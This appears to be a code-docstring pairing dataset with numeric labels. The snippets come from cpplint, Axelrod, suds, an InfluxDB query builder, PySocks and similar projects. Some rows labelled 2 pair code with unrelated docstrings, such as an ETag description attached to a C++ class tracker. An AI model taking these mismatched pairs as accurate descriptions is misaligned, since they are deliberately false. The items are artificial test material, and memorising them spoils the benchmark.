numpy.array(score_diffs) / float(match_length) mean_score_diff = numpy.mean(score_diffs) std_score_diff = numpy.std(score_diffs) mean_first_defection = counter_mean(first_defection) return (initial_plays, context_dict, context_counts, mean_score, std_score, mean_score_diff, std_score_diff, mean_first_defection)	Compute various quantities of interest for the given matchup.
1	def table_1(players, initial=10): path = Path("assets") / "csv" / "table_1.csv" writer = csv.writer(path.open('w')) contexts = [(C, C), (C, D), (D, C), (D, D)] context_keys = ["C_prob"] context_keys.extend(contexts) context_keys.extend(itertools.product(contexts, repeat=2)) header = ["player_name", "opponent_name", "stochastic", "memory_depth", "mean_score", "std_score", "mean_score_diff", "std_score_diff", "mean_first_defection"] header.extend(["round_" + str(i+1) for i in range(initial)]) header.append("C_prob") header.extend(["".join(x) for x in contexts]) header.extend(["".join(x) + "".join(y) for (x, y) in itertools.product(contexts, repeat=2)]) header.extend(["".join(x) + "_pct" for x in contexts]) header.extend(["".join(x) + "".join(y) + "_pct" for (x, y) in itertools.product(contexts, repeat=2)]) writer.writerow(header) for p1 in players: for p2 in players: (initial_plays, context_dict, context_counts, mean_score, std_score, mean_score_diff, std_score_diff, mean_first_defection) = summarize_matchup(p1, p2, initial=initial) row = [normalized_name(p1), normalized_name(p2), p1.classifier["stochastic"], p1.classifier["memory_depth"], mean_score, std_score, mean_score_diff, std_score_diff, mean_first_defection] row.extend(initial_plays) for key in context_keys: row.append(context_dict[key]) for key in context_keys: if key == "C_prob": continue row.append(context_counts[key]) writer.writerow(row)	Table 1: For each strategy pair, compute the probability of cooperation on the first 10 rounds, the mean, median, and deviation for scores, and score diffs, probabilities for each context C, D, CC, CD, DC, DD, ..., overall C and D.
1	def table_2(players, initial=10): tournament_data = list(load_tournament_data()) path = Path("assets") / "csv" / "table_2.csv" writer = csv.writer(path.open('w')) contexts = [(C, C), (C, D), (D, C), (D, D)] context_keys = ["C_prob"] context_keys.extend(contexts) context_keys.extend(itertools.product(contexts, repeat=2)) header = ["player_name", "stochastic", "memory_depth", "mean_score", "std_score", "mean_score_diff", "std_score_diff", "mean_first_defection"] header.extend(["round_" + str(i+1) for i in range(initial)]) header.append("C_prob") header.extend(["".join(x) for x in contexts]) header.extend(["".join(x) + "".join(y) for (x, y) in itertools.product(contexts, repeat=2)]) header.extend(["".join(x) + "_pct" for x in contexts]) header.extend(["".join(x) + "".join(y) + "_pct" for (x, y) in itertools.product(contexts, repeat=2)]) header.extend(["tournament_score_mean", "tournament_score_std", "tournament_win_mean", "tournament_win_std"]) writer.writerow(header) for i, p1 in enumerate(players): print(i, "of", len(players)) (initial_plays, context_dict, context_counts, mean_score, std_score, mean_score_diff, std_score_diff, mean_first_defection) = summarize_player(p1, players, initial=initial) row = [normalized_name(p1), p1.classifier["stochastic"], p1.classifier["memory_depth"], mean_score, std_score, mean_score_diff, std_score_diff, mean_first_defection] row.extend(initial_plays) for key in context_keys: row.append(context_dict[key]) for key in context_keys: if key == "C_prob": continue row.append(context_counts[key]) row.extend(tournament_data[i][1:]) # ignore name (first element) writer.writerow(row)	Table 2: for each strategy: name memory depth is_stochastic average over all strategies: prob cooperation on first 5 moves prob cooperation on last 5 moves prob cooperation for each context C, D prob cooperation for each context CC, CD, DC, DD prob cooperation for each context [C, D]**3
1	def tournament_data(players, turns=200, repetitions=100): results = run_tournament("--", players, turns=turns, repetitions=repetitions) score_data = results.normalised_scores win_data = results.wins mean_scores = [numpy.mean(s) for s in score_data] std_scores = [numpy.std(s) for s in score_data] mean_wins = [numpy.mean(w) for w in win_data] std_wins = [numpy.std(w) for w in win_data] return (mean_scores, std_scores, mean_wins, std_wins)	Run tournaments with repetition and record the following: mean score mean wins wins deviation score deviation
1	def CheckBegin(self, filename, clean_lines, linenum, error): pass	Run checks that applies to text up to the opening brace. This is mostly for checking the text after the class identifier and the "{", usually where the base class is specified. For other blocks, there isn't much to check, so we always pass. Args: filename: The name of the current file. clean_lines: A CleansedLines instance containing the file. linenum: The number of the line to check. error: The function to call with any errors found.
1	def CheckEnd(self, filename, clean_lines, linenum, error): pass	Run checks that applies to text after the closing brace. This is mostly used for checking end of namespace comments. Args: filename: The name of the current file. clean_lines: A CleansedLines instance containing the file. linenum: The number of the line to check. error: The function to call with any errors found.
1	class _BlockInfo(object): def __init__(self, seen_open_brace): self.seen_open_brace = seen_open_brace self.open_parentheses = 0 self.inline_asm = _NO_ASM def CheckBegin(self, filename, clean_lines, linenum, error): """Run checks that applies to text up to the opening brace. This is mostly for checking the text after the class identifier and the "{", usually where the base class is specified. For other blocks, there isn't much to check, so we always pass. Args: filename: The name of the current file. clean_lines: A CleansedLines instance containing the file. linenum: The number of the line to check. error: The function to call with any errors found. """ pass def CheckEnd(self, filename, clean_lines, linenum, error): """Run checks that applies to text after the closing brace. This is mostly used for checking end of namespace comments. Args: filename: The name of the current file. clean_lines: A CleansedLines instance containing the file. linenum: The number of the line to check. error: The function to call with any errors found. """ pass class _ClassInfo(_BlockInfo):	Stores information about a generic block of code.
2	class _ClassInfo(_BlockInfo): def __init__(self, name, class_or_struct, clean_lines, linenum): _BlockInfo.__init__(self, False) self.name = name self.starting_linenum = linenum self.is_derived = False if class_or_struct == 'struct': self.access = 'public' self.is_struct = True else: self.access = 'private' self.is_struct = False initial_indent = Match(r'^( *)\S', clean_lines.raw_lines[linenum]) if initial_indent: self.class_indent = len(initial_indent.group(1)) else: self.class_indent = 0 self.last_line = 0 depth = 0 for i in range(linenum, clean_lines.NumLines()): line = clean_lines.elided[i] depth += line.count('{') - line.count('}') if not depth: self.last_line = i break def CheckBegin(self, filename, clean_lines, linenum, error): if Search('(^|[^:]):($|[^:])', clean_lines.elided[linenum]): self.is_derived = True def CheckEnd(self, filename, clean_lines, linenum, error): indent = Match(r'^( *)\}', clean_lines.elided[linenum]) if indent and len(indent.group(1)) != self.class_indent: if self.is_struct: parent = 'struct ' + self.name else: parent = 'class ' + self.name error(filename, linenum, 'whitespace/indent', 3, 'Closing brace should be aligned with beginning of %s' % parent) class _NamespaceInfo(_BlockInfo):	Represents an ETag of *, or a missing ETag when matching is'safe'
1	def SetOutputFormat(self, output_format): self.output_format = output_format	Sets the output format for errors.
1	def SetVerboseLevel(self, level): last_verbose_level = self.verbose_level self.verbose_level = level return last_verbose_level	Sets the module's verbosity, and returns the previous setting.
1	def SetCountingStyle(self, counting_style): self.counting = counting_style	Sets the module's counting options.
1	def SetFilters(self, filters): self.filters = _DEFAULT_FILTERS[:] for filt in filters.split(','): clean_filt = filt.strip() if clean_filt: self.filters.append(clean_filt) for filt in self.filters: if not (filt.startswith('+') or filt.startswith('-')): raise ValueError('Every filter in --filters must start with + or -' ' (%s does not)' % filt)	Sets the error-message filters. These filters are applied when deciding whether to emit a given error message. Args: filters: A string of comma-separated filters (eg "+whitespace/indent"). Each filter should start with + or -; else we die. Raises: ValueError: The comma-separated filters did not all start with '+' or '-'. E.g. "-,+whitespace,-whitespace/indent,whitespace/badfilter"
1	def ResetErrorCounts(self): self.error_count = 0 self.errors_by_category = {}	Sets the module's error statistic back to zero.
1	def IncrementErrorCount(self, category): self.error_count += 1 if self.counting in ('toplevel', 'detailed'): if self.counting != 'detailed': category = category.split('/')[0] if category not in self.errors_by_category: self.errors_by_category[category] = 0 self.errors_by_category[category] += 1	Bumps the module's error statistic.
1	def PrintErrorCounts(self): for category, count in self.errors_by_category.items(): sys.stderr.write('cpplint: Category \'%s\' errors found: %d\n' % (category, count)) if 0 < self.error_count: sys.stderr.write('cpplint: Total errors found: %d\n' % self.error_count)	Print a summary of errors by category, and the total.
2	class _CppLintState(object): def __init__(self): self.verbose_level = 1 self.error_count = 0 self.filters = _DEFAULT_FILTERS[:] self.counting = 'total' self.errors_by_category = {} self.output_format = 'emacs' def SetOutputFormat(self, output_format): """Sets the output format for errors.""" self.output_format = output_format def SetVerboseLevel(self, level): """Sets the module's verbosity, and returns the previous setting.""" last_verbose_level = self.verbose_level self.verbose_level = level return last_verbose_level def SetCountingStyle(self, counting_style): """Sets the module's counting options.""" self.counting = counting_style def SetFilters(self, filters): """Sets the error-message filters. These filters are applied when deciding whether to emit a given error message. Args: filters: A string of comma-separated filters (eg "+whitespace/indent"). Each filter should start with + or -; else we die. Raises: ValueError: The comma-separated filters did not all start with '+' or '-'. E.g. "-,+whitespace,-whitespace/indent,whitespace/badfilter" """ self.filters = _DEFAULT_FILTERS[:] for filt in filters.split(','): clean_filt = filt.strip() if clean_filt: self.filters.append(clean_filt) for filt in self.filters: if not (filt.startswith('+') or filt.startswith('-')): raise ValueError('Every filter in --filters must start with + or -' ' (%s does not)' % filt) def ResetErrorCounts(self): """Sets the module's error statistic back to zero.""" self.error_count = 0 self.errors_by_category = {} def IncrementErrorCount(self, category): """Bumps the module's error statistic.""" self.error_count += 1 if self.counting in ('toplevel', 'detailed'): if self.counting != 'detailed': category = category.split('/')[0] if category not in self.errors_by_category: self.errors_by_category[category] = 0 self.errors_by_category[category] += 1 def PrintErrorCounts(self): """Print a summary of errors by category, and the total.""" for category, count in self.errors_by_category.items(): sys.stderr.write('cpplint: Category \'%s\' errors found: %d\n' % (category, count)) # SRombauts: "cpplint:" prefix and error message only when appropriate if 0 < self.error_count: sys.stderr.write('cpplint: Total errors found: %d\n' % self.error_count) _cpplint_state = _CppLintState()	A middleware that has not yet been bound to an application or\nconfigured.
1	def Begin(self, function_name): self.in_a_function = True self.lines_in_function = 0 self.current_function = function_name	Start analyzing function body. Args: function_name: The name of the function being tracked.
1	def Count(self): if self.in_a_function: self.lines_in_function += 1	Count line in current function body.
1	def Check(self, error, filename, linenum): if Match(r'T(EST|est)', self.current_function): base_trigger = self._TEST_TRIGGER else: base_trigger = self._NORMAL_TRIGGER trigger = base_trigger * 2**_VerboseLevel() if self.lines_in_function > trigger: error_level = int(math.log(self.lines_in_function / base_trigger, 2)) if error_level > 5: error_level = 5 error(filename, linenum, 'readability/fn_size', error_level, 'Small and focused functions are preferred:' ' %s has %d non-comment lines' ' (error triggered by exceeding %d lines).' % ( self.current_function, self.lines_in_function, trigger))	Report if too many lines in function body. Args: error: The function to call with any errors found. filename: The name of the current file. linenum: The number of the line to check.
1	def End(self): self.in_a_function = False	Stop analyzing function body.
1	class _FunctionState(object): _NORMAL_TRIGGER = 250 _TEST_TRIGGER = 400 def __init__(self): self.in_a_function = False self.lines_in_function = 0 self.current_function = '' def Begin(self, function_name): """Start analyzing function body. Args: function_name: The name of the function being tracked. """ self.in_a_function = True self.lines_in_function = 0 self.current_function = function_name def Count(self): """Count line in current function body.""" if self.in_a_function: self.lines_in_function += 1 def Check(self, error, filename, linenum): """Report if too many lines in function body. Args: error: The function to call with any errors found. filename: The name of the current file. linenum: The number of the line to check. """ if Match(r'T(EST|est)', self.current_function): base_trigger = self._TEST_TRIGGER else: base_trigger = self._NORMAL_TRIGGER trigger = base_trigger * 2**_VerboseLevel() if self.lines_in_function > trigger: error_level = int(math.log(self.lines_in_function / base_trigger, 2)) if error_level > 5: error_level = 5 error(filename, linenum, 'readability/fn_size', error_level, 'Small and focused functions are preferred:' ' %s has %d non-comment lines' ' (error triggered by exceeding %d lines).' % ( self.current_function, self.lines_in_function, trigger)) def End(self): """Stop analyzing function body.""" self.in_a_function = False class _IncludeError(Exception):	Tracks current function name and the number of lines in its body.
1	class _IncludeError(Exception): pass class FileInfo:	Indicates a problem with the include order in a file.
1	def CanonicalizeAlphabeticalOrder(self, header_path): return header_path.replace('-inl.h', '.h').replace('-', '_').lower()	Returns a path canonicalized for alphabetical comparison. - replaces "-" with "_" so they both cmp the same. - removes '-inl' since we don't require them to be after the main header. - lowercase everything, just in case. Args: header_path: Path to be canonicalized. Returns: Canonicalized path.
1	def IsInAlphabeticalOrder(self, clean_lines, linenum, header_path): if (self._last_header > header_path and not Match(r'^\s*$', clean_lines.elided[linenum - 1])): return False return True	Check if a header is in alphabetical order with the previous header. Args: clean_lines: A CleansedLines instance containing the file. linenum: The number of the line to check. header_path: Canonicalized header to be checked. Returns: Returns true if the header is in alphabetical order.
1	def CheckNextIncludeOrder(self, header_type): error_message = ('Found %s after %s' % (self._TYPE_NAMES[header_type], self._SECTION_NAMES[self._section])) last_section = self._section if header_type == _C_SYS_HEADER: if self._section <= self._C_SECTION: self._section = self._C_SECTION else: self._last_header = '' return error_message elif header_type == _CPP_SYS_HEADER: if self._section <= self._CPP_SECTION: self._section = self._CPP_SECTION else: self._last_header = '' return error_message elif header_type == _LIKELY_MY_HEADER: if self._section <= self._MY_H_SECTION: self._section = self._MY_H_SECTION else: self._section = self._OTHER_H_SECTION elif header_type == _POSSIBLE_MY_HEADER: if self._section <= self._MY_H_SECTION: self._section = self._MY_H_SECTION else: self._section = self._OTHER_H_SECTION else: assert header_type == _OTHER_HEADER self._section = self._OTHER_H_SECTION if last_section != self._section: self._last_header = '' return ''	Returns a non-empty error message if the next header is out of order. This function also updates the internal state to be ready to check the next include. Args: header_type: One of the _XXX_HEADER constants defined above. Returns: The empty string if the header is in the right order, or an error message describing what's wrong.
1	def CheckEnd(self, filename, clean_lines, linenum, error): line = clean_lines.raw_lines[linenum] if (linenum - self.starting_linenum < 10 and not Match(r'};*\s*(//|/\*).*\bnamespace\b', line)): return # Look for matching comment at end of namespace. if self.name: if not Match((r'};*\s*(//|/\*).*\bnamespace\s+' + re.escape(self.name) + r'[\*/\.\\\s]*$'), line): error(filename, linenum, 'readability/namespace', 5, 'Namespace should be terminated with "// namespace %s"' % self.name) else: if not Match(r'};*\s*(//|/\*).*\bnamespace[\*/\.\\\s]*$', line): error(filename, linenum, 'readability/namespace', 5, 'Namespace should be terminated with "// namespace"')	Check end of namespace comments.
1	class _NamespaceInfo(_BlockInfo): def __init__(self, name, linenum): _BlockInfo.__init__(self, False) self.name = name or '' self.starting_linenum = linenum def CheckEnd(self, filename, clean_lines, linenum, error): """Check end of namespace comments.""" line = clean_lines.raw_lines[linenum] if (linenum - self.starting_linenum < 10 and not Match(r'};*\s*(//|/\*).*\bnamespace\b', line)): return if self.name: if not Match((r'};*\s*(//|/\*).*\bnamespace\s+' + re.escape(self.name) + r'[\*/\.\\\s]*$'), line): error(filename, linenum, 'readability/namespace', 5, 'Namespace should be terminated with "// namespace %s"' % self.name) else: if not Match(r'};*\s*(//|/\*).*\bnamespace[\*/\.\\\s]*$', line): error(filename, linenum, 'readability/namespace', 5, 'Namespace should be terminated with "// namespace"') class _PreprocessorInfo(object):	Stores information about a namespace.
1	def SeenOpenBrace(self): return (not self.stack) or self.stack[-1].seen_open_brace	Check if we have seen the opening brace for the innermost block. Returns: True if we have seen the opening brace, False if the innermost block is still expecting an opening brace.
1	def InNamespaceBody(self): return self.stack and isinstance(self.stack[-1], _NamespaceInfo)	Check if we are currently one level inside a namespace body. Returns: True if top of the stack is a namespace block, False otherwise.
1	def InnermostClass(self): for i in range(len(self.stack), 0, -1): classinfo = self.stack[i - 1] if isinstance(classinfo, _ClassInfo): return classinfo return None	Get class info on the top of the stack. Returns: A _ClassInfo object if we are inside a class, or None otherwise.
1	def CheckCompletedBlocks(self, filename, error): for obj in self.stack: if isinstance(obj, _ClassInfo): error(filename, obj.starting_linenum, 'build/class', 5, 'Failed to find complete declaration of class %s' % obj.name) elif isinstance(obj, _NamespaceInfo): error(filename, obj.starting_linenum, 'build/namespaces', 5, 'Failed to find complete declaration of namespace %s' % obj.name)	Checks that all classes and namespaces have been completely parsed. Call this when all lines in a file have been processed. Args: filename: The name of the current file. error: The function to call with any errors found.
1	def Clone(self): return Cursor(self.line, self.column)	Returns a copy of self.
1	class Cursor: def __init__(self, line=-1, column=-1): self.line = line self.column = column def __eq__(self, rhs): return self.line == rhs.line and self.column == rhs.column def __ne__(self, rhs): return not self == rhs def __lt__(self, rhs): return self.line < rhs.line or ( self.line == rhs.line and self.column < rhs.column) def __le__(self, rhs): return self < rhs or self == rhs def __gt__(self, rhs): return rhs < self def __ge__(self, rhs): return rhs <= self def __str__(self): if self == Eof(): return 'EOF' else: return '%s(%s)' % (self.line + 1, self.column) def __add__(self, offset): return Cursor(self.line, self.column + offset) def __sub__(self, offset): return Cursor(self.line, self.column - offset) def Clone(self): return Cursor(self.line, self.column) def Eof():	Represents a position (line and column) in a text file.
1	class FakeOs(object): P_WAIT = os.P_WAIT def __init__(self, fake_path_module): self.path = fake_path_module self.environ = os.environ def listdir(self, path): assert self.path.isdir(path) return self.path.PathElement(path).iterkeys() def spawnv(self, wait, executable, *kargs): assert wait == FakeOs.P_WAIT return self.spawn_impl(executable, kargs) class GetTestsToRunTest(unittest.TestCase):	A fake os module for testing.
1	def PathElement(self, path): tree = self.tree name_list = self.abspath(path).split(self.path_separator) for name in name_list: if not name: continue tree = tree.get(name, None) if tree is None: break return tree	Returns an internal representation of directory tree entry for path.
1	class FakePath(object): def __init__(self, current_dir=os.getcwd(), known_paths=None): self.current_dir = current_dir self.tree = {} self.path_separator = os.sep if known_paths: self._AddPaths(known_paths) def _AddPath(self, path): ends_with_slash = path.endswith('/') path = self.abspath(path) if ends_with_slash: path += self.path_separator name_list = path.split(self.path_separator) tree = self.tree for name in name_list[:-1]: if not name: continue if name in tree: tree = tree[name] else: tree[name] = {} tree = tree[name] name = name_list[-1] if name: if name in tree: assert tree[name] == 1 else: tree[name] = 1 def _AddPaths(self, paths): for path in paths: self._AddPath(path) def PathElement(self, path): tree = self.tree name_list = self.abspath(path).split(self.path_separator) for name in name_list: if not name: continue tree = tree.get(name, None) if tree is None: break return tree def normpath(self, path): return os.path.normpath(path) def abspath(self, path): return self.normpath(os.path.join(self.current_dir, path)) def isfile(self, path): return self.PathElement(self.abspath(path)) == 1 def isdir(self, path): return type(self.PathElement(self.abspath(path))) == type(dict()) def basename(self, path): return os.path.basename(path) def dirname(self, path): return os.path.dirname(path) def join(self, *kargs): return os.path.join(*kargs) class FakeOs(object):	A fake os.path module for testing.
1	def NormalizeGetTestsToRunResults(self, results): def NormalizePythonTestPair(pair): return (os.path.normpath(pair[0]), os.path.normpath(pair[1])) def NormalizeBinaryTestPair(pair): directory, executable = map(os.path.normpath, pair) if run_tests_util.IS_WINDOWS or run_tests_util.IS_CYGWIN: executable = re.sub(r'\.exe$', '', executable) return (directory, executable) python_tests = sets.Set(map(NormalizePythonTestPair, results[0])) binary_tests = sets.Set(map(NormalizeBinaryTestPair, results[1])) return (python_tests, binary_tests)	Normalizes path data returned from GetTestsToRun for comparison.
1	class CheckIP(SimpleTask): def __init__(self): SimpleTask.__init__(self, "CheckIP") self._counter = 0 def process(self, item): if self._counter <= 0: item.log_output('Checking IP address.') ip_set = set() ip_set.add(socket.gethostbyname('twitter.com')) ip_set.add(socket.gethostbyname('facebook.com')) ip_set.add(socket.gethostbyname('youtube.com')) ip_set.add(socket.gethostbyname('microsoft.com')) ip_set.add(socket.gethostbyname('icanhas.cheezburger.com')) ip_set.add(socket.gethostbyname('archiveteam.org')) if len(ip_set) != 6: item.log_output('Got IP addresses: {0}'.format(ip_set)) item.log_output( 'Are you behind a firewall/proxy? That is a big no-no!') raise Exception( 'Are you behind a firewall/proxy? That is a big no-no!') if self._counter <= 0: self._counter = 10 else: self._counter -= 1 class PrepareDirectories(SimpleTask):	Simple tasks (tasks that do not need any concurrency) are based on the SimpleTask class and have a process(item) method that is called for each item.
2	VERSION = "20151003.01"	Update this each time you make a non-cosmetic change. It will be added to the WARC files and reported to the tracker.
1	def base36_encode(n): alphabet="0123456789abcdefghijklmnopqrstuvwxyz" if not (isinstance(n, int) or isinstance(n, long)): raise TypeError('value to encode must be an int or long') r = [] base = len(alphabet) while n >= base: r.append(alphabet[n % base]) n = n / base r.append(str(alphabet[n % base])) r.reverse() return ''.join(r)	Encode integer value `n` using `alphabet`. The resulting string will be a base-N representation of `n`, where N is the length of `alphabet`. Copied from https://github.com/benhodgson/basin/blob/master/src/basin.py
1	class All(Collection): def all(self): return True class Choice(Collection):	Represents an (xsd) schema?node.
1	class Any(Content): def get_child(self, name): root = self.root.clone() root.set('note', 'synthesized (any) child') child = Any(self.schema, root) return (child, []) def get_attribute(self, name): root = self.root.clone() root.set('note', 'synthesized (any) attribute') attribute = Any(self.schema, root) return (attribute, []) def any(self): return True class Factory:	Represents an (xsd)?node
1	def __init__(self, marshaller): self.marshaller = marshaller	@param marshaller: A marshaller. @type marshaller: L{suds.mx.core.Core}
1	def node(self, content): return self.marshaller.node(content)	Create and return an XML node that is qualified using the I{type}. Also, make sure all referenced namespace prefixes are declared. @param content: The content for which proccessing has ended. @type content: L{Object} @return: A new node. @rtype: L{Element}
1	def setnil(self, node, content): self.marshaller.setnil(node, content)	Set the value of the I{node} to nill. @param node: A I{nil} node. @type node: L{Element} @param content: The content for which proccessing has ended. @type content: L{Object}
1	def setdefault(self, node, content): return self.marshaller.setdefault(node, content)	Set the value of the I{node} to a default value. @param node: A I{nil} node. @type node: L{Element} @param content: The content for which proccessing has ended. @type content: L{Object} @return: The default.
1	def optional(self, content): return self.marshaller.optional(content)	Get whether the specified content is optional. @param content: The content which to check. @type content: L{Content}
1	def suspend(self, content): self.marshaller.suspend(content)	Notify I{marshaller} that appending this content has suspended. @param content: The content for which proccessing has been suspended. @type content: L{Object}
1	def resume(self, content): self.marshaller.resume(content)	Notify I{marshaller} that appending this content has resumed. @param content: The content for which proccessing has been resumed. @type content: L{Object}
1	def bodypart_types(self, method, input=True): result = [] if input: parts = method.soap.input.body.parts else: parts = method.soap.output.body.parts for p in parts: if p.element is not None: query = ElementQuery(p.element) else: query = TypeQuery(p.type) pt = query.execute(self.schema()) if pt is None: raise TypeNotFound(query.ref) if p.type is not None: pt = PartElement(p.name, pt) if input: if pt.name is None: result.append((p.name, pt)) else: result.append((pt.name, pt)) else: result.append(pt) return result	Get a list of I{parameter definitions} (pdef) defined for the specified method. Each I{pdef} is a tuple (I{name}, L{xsd.sxbase.SchemaObject}) @param method: A service method. @type method: I{service.Method} @param input: Defines input/output message. @type input: boolean @return: A list of parameter definitions @rtype: [I{pdef},]
1	class BlindQuery(Query): def execute(self, schema): if schema.builtin(self.ref): name = self.ref[0] b = Factory.create(schema, name) log.debug('%s, found builtin (%s)', self.id, name) return b result = None for d in (schema.elements, schema.types): result = d.get(self.ref) if self.filter(result): result = None else: break if result is None: eq = ElementQuery(self.ref) eq.history = self.history result = eq.execute(schema) return self.result(result) class TypeQuery(Query):	Schema query class that I{blindly} searches for a reference in the specified schema. It may be used to find Elements and Types but will match on an Element first. This query will also find builtins.
1	def __init__(self, resolver): self.resolver = resolver	@param resolver: A schema object name resolver. @type resolver: L{resolver.Resolver}
1	def build(self, name): if isinstance(name, basestring): type = self.resolver.find(name) if type is None: raise TypeNotFound(name) else: type = name cls = type.name if type.mixed(): data = Factory.property(cls) else: data = Factory.object(cls) resolved = type.resolve() md = data.__metadata__ md.sxtype = resolved md.ordering = self.ordering(resolved) history = [] self.add_attributes(data, resolved) for child, ancestry in type.children(): if self.skip_child(child, ancestry): continue self.process(data, child, history[:]) return data	build a an object for the specified typename as defined in the schema
1	def process(self, data, type, history): if type in history: return if type.enum(): return history.append(type) resolved = type.resolve() value = None if type.unbounded(): value = [] else: if len(resolved) > 0: if resolved.mixed(): value = Factory.property(resolved.name) md = value.__metadata__ md.sxtype = resolved else: value = Factory.object(resolved.name) md = value.__metadata__ md.sxtype = resolved md.ordering = self.ordering(resolved) setattr(data, type.name, value) if value is not None: data = value if not isinstance(data, list): self.add_attributes(data, resolved) for child, ancestry in resolved.children(): if self.skip_child(child, ancestry): continue self.process(data, child, history[:])	process the specified type then process its children
1	def set_options(self, **kwargs): p = Unskin(self.options) p.update(kwargs)	Set options. @param kwargs: keyword arguments. @see: L{Options}
1	def add_prefix(self, prefix, uri): root = self.wsdl.root mapped = root.resolvePrefix(prefix, None) if mapped is None: root.addPrefix(prefix, uri) return if mapped[1] != uri: raise Exception('"%s" already mapped as "%s"' % (prefix, mapped))	Add I{static} mapping of an XML namespace prefix to a namespace. This is useful for cases when a wsdl and referenced schemas make heavy use of namespaces and those namespaces are subject to changed. @param prefix: An XML namespace prefix. @type prefix: str @param uri: An XML namespace URI. @type uri: str @raise Exception: when prefix is already mapped.
1	def last_sent(self): return self.messages.get('tx')	Get last sent I{soap} message. @return: The last sent I{soap} message. @rtype: L{Document}
1	class ComplexContent(SchemaObject): def childtags(self): return ('attribute', 'attributeGroup', 'extension', 'restriction') def extension(self): for c in self.rawchildren: if c.extension(): return True return False def restriction(self): for c in self.rawchildren: if c.restriction(): return True return False class SimpleContent(SchemaObject):	Represents an (xsd) schema?node.
1	def __init__(self, tag=None, value=None, **kwargs): Object.__init__(self) self.tag = tag self.value = value for k,v in kwargs.items(): setattr(self, k, v)	@param tag: The content tag. @type tag: str @param value: The content's value. @type value: I{any}
1	class Content(Object): extensions = [] def __init__(self, tag=None, value=None, **kwargs): """ @param tag: The content tag. @type tag: str @param value: The content's value. @type value: I{any} """ Object.__init__(self) self.tag = tag self.value = value for k,v in kwargs.items(): setattr(self, k, v) def __getattr__(self, name): if name not in self.__dict__: if name in self.extensions: v = None setattr(self, name, v) else: raise AttributeError, \ 'Content has no attribute %s' % name else: v = self.__dict__[name] return v	Marshaller Content. @ivar tag: The content tag. @type tag: str @ivar value: The content's value. @type value: I{any}
1	public OvalButton(String text) { super(); setText(text); setContentAreaFilled(false); setBorderPainted(false); setFont(new Font("Thoma", Font.BOLD, 12)); setForeground(Color.WHITE); setFocusable(false); }	Constructor takes String argument
1	class Func(Expression): identifier = None _valid_arg_types = {str} def __init__(self, *args): super(Func, self).__init__(None) self.validate_args(*args) self._args = args def validate_arg_length(self, args, length): if len(args) != length: raise ValueError(u"Function %s takes %i arguments" % ( self.identifier, length)) def validate_args(self, *args): self.validate_arg_length(args, 1) def format(self): formatted_args = [] for arg in self._args: if issubclass(type(arg), Func): formatted_args.append(arg.format()) elif type(arg) in self._valid_arg_types: formatted_args.append(arg) else: formatted_args.append(u"%r" % arg) return u"%s(%s)%s" % (self.identifier, ", ".join(formatted_args), self._format_as()) class Count(Func):	Base class for an InfluxDB function
1	def select(self, *expressions): if not expressions: raise TypeError("Select takes at least one expression") self._select_expressions.extend(expressions) return self	Could be a one or more column names or expressions composed of functions from http://influxdb.org/docs/query_language/functions.html
1	def date_range(self, start=None, end=None): if not start and not end: raise ValueError("date_range requires either a start or end") elif start and end and start > end: raise ValueError( "date_range boundaries should have start <= end, got %r > %r" % ( start, end)) if start: self._where['time__gt'] = start self._start_time = start if end: self._where['time__lt'] = end self._end_time = end return self	Insert where clauses to filter by date
1	def order(self, field, order): if order.lower() not in self._order_identifiers: raise ValueError("order must either be 'asc' or 'desc'") self._order_by = [field] self._order = order.upper() return self	Allows you to order by time ascending or descending. Time is the only way to order from InfluxDB itself.
1	def _format_select_expressions(self, *select_expressions): return ", ".join([ self._format_select_expression(s) for s in select_expressions ])	Format the function stack to form a function clause If it's empty and there are no functions we just return the column name
1	def _format_query(self, query): query = re.sub(r' +', ' ', query) if query[-1] == ' ': query = query[:len(query) - 1] return query + ';'	Trims extra spaces and inserts a semicolon at the end
1	def format_timedelta(td): total_seconds = td.total_seconds() units = [(604800, 'w'), (86400, 'd'), (3600, 'h'), (60, 'm'), (1, 's')] for seconds, unit in units: if total_seconds >= seconds and total_seconds % seconds == 0: return "%r%s" % (int(total_seconds / seconds), unit) if total_seconds >= 0.001: if (total_seconds / 0.001) % 1 == 0: return "%r%s" % (int(total_seconds * 1000), 'ms') else: micro = int(total_seconds / 0.000001) micro += int(total_seconds % 0.000001) return "%r%s" % (micro, 'us') return "%r%s" % (int(total_seconds * 1000000), 'us')	formats a timedelta into the largest unit possible
1	def test_format_limit(): q = Query().limit(1000) assert q._format_limit() == 'LIMIT 1000' @pytest.mark.unit	_format_lmit should correctly format the limit clause
1	def test_format_order(): q = Query().order('time', 'asc') assert q._format_order() == 'ORDER BY time ASC' q.order('time', 'desc') assert q._format_order() == 'ORDER BY time DESC' q = Query().order('time', 'ASC') assert q._format_order() == 'ORDER BY time ASC' q.order('time', 'DESC') assert q._format_order() == 'ORDER BY time DESC' @pytest.mark.unit	_format_order should correctly format the order clause
1	class _BaseSocket(socket.socket): def __init__(self, *pos, **kw): _orig_socket.__init__(self, *pos, **kw) self._savedmethods = dict() for name in self._savenames: self._savedmethods[name] = getattr(self, name) delattr(self, name) _savenames = list() def _makemethod(name):	Allows Python 2's "delegated" methods such as send() to be overridden
1	class ProxyError(IOError): def __init__(self, msg, socket_err=None): self.msg = msg self.socket_err = socket_err if socket_err: self.msg += ": {0}".format(socket_err) def __str__(self): return self.msg class GeneralProxyError(ProxyError): pass	socket_err contains original socket.error exception.
1	def set_proxy(self, proxy_type=None, addr=None, port=None, rdns=True, username=None, password=None): self.proxy = (proxy_type, addr, port, rdns, username.encode() if username else None, password.encode() if password else None)	set_proxy(proxy_type, addr[, port[, rdns[, username[, password]]]]) Sets the proxy to be used. proxy_type - The type of the proxy to be used. Three types are supported: PROXY_TYPE_SOCKS4 (including socks4a), PROXY_TYPE_SOCKS5 and PROXY_TYPE_HTTP addr - The address of the server (IP or DNS). port - The port of the server. Defaults to 1080 for SOCKS servers and 8080 for HTTP proxy servers. rdns - Should DNS queries be performed on the remote side (rather than the local side). The default is True. Note: This has no effect with SOCKS4 servers. username - Username to authenticate with to the server. The default is no authentication. password - Password to authenticate with to the server. Only relevant when username is also provided.
